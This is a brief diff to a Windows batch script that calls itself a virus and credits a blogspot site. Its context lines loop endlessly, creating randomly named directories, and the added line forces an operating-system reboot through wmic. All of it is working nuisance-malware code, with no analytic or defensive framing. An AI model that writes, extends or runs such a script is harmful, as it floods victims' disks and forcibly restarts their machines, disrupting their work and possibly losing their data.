@@ -14,3 +14,4 @@ md %RANDOM%
 goto VIRUS
 REM #######################
 REM errorcode401.blogspot.in
+wmic os where primary=1 reboot
